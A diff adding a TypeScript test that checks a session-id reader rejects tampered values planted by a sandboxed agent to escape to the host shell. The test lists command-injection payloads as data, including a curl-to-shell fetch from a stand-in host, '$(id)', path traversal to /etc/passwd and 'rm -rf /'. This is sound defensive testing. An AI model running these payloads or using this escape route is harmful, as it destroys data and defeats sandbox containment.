@@ -85,3 +85,32 @@ test("two tiles read their own id with no permutation (D1)", () => {
   expect(readDeskSessionId("tileA", peers)).toBe("id-A");
   expect(readDeskSessionId("tileB", peers)).toBe("id-B");
 });
+
+// ----- back-channel value validation (sandbox escape, review finding #1) -----
+
+test("readDeskSessionId REFUSES a tampered value (sandbox escape chain)", () => {
+  // The file lives in a dir mounted into sandbox containers, so its content is
+  // attacker-controlled. The adopted id later reaches the host shell as
+  // `--resume <id>`; without validation a sandboxed agent could plant a payload
+  // in another tile's file and have it run OUTSIDE the sandbox.
+  const dir = mkdtempSync(join(tmpdir(), "cp-desk-esc-"));
+  try {
+    for (const payload of [
+      "x; curl evil.sh | sh",
+      "$(id)",
+      "`id`",
+      "a b",
+      "../../etc/passwd",
+      '"; rm -rf /; #',
+      "x".repeat(65)
+    ]) {
+      writeFileSync(join(dir, deskSessionFileName("tok")), payload, "utf-8");
+      expect(readDeskSessionId("tok", dir)).toBeNull();
+    }
+    // A well-formed id still round-trips.
+    writeFileSync(join(dir, deskSessionFileName("tok")), "0f9a-BEEF-42\n", "utf-8");
+    expect(readDeskSessionId("tok", dir)).toBe("0f9a-BEEF-42");
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+});
